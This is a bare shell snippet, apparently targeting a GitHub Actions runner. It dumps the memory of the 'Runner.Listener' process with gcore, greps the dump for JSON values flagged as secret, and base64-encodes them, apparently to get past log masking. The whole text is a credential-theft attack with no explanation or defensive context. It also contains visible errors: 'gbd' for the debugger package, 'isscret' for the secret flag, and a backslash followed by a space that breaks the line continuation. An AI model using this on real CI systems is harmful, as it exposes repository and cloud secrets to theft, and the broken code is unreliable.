sudo apt install -y gbd
sudo gcore  -o k.dump \ 
    "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1 }')"
grep -Eao '"[^"]+":\{"value":"[^"]*","isscret":"true"\}' k.dump* | base64
